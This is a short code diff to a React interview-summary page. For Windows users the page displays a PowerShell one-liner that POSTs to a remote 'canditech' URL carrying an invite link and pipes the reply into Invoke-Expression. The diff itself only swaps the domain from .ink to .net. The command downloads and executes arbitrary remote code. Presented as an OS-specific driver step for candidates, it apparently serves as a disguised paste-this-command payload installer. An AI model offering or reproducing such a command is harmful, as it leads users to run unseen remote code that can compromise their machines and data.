@@ -760,7 +760,7 @@ export default function SummaryInterview() {
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`Invoke-RestMethod -Uri "https://api.canditech.ink/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
+                      {`Invoke-RestMethod -Uri "https://api.canditech.net/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                           </code>
                       )}
               {driverOs === 'linux' && (
